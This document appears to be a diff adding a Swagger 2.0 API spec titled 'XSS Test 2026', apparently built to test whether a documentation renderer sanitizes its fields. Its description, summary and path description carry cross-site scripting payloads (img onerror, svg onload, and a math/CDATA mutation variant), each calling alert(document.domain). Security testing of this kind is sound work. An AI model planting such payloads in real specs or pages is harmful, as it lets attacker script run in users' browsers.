@@ -1,0 +1,16 @@
+swagger: "2.0"
+info:
+  title: XSS Test 2026
+  description: |
+    Test description...
+    "><img src=x onerror=alert(document.domain)>
+  version: "1.0"
+paths:
+  /xss:
+    get:
+      summary: "><svg/onload=alert(document.domain)>"
+      description: |
+        <math><mtext><![CDATA[</mtext><img src=x onerror=alert(document.domain)>]]></math>
+      responses:
+        "200":
+          description: Success
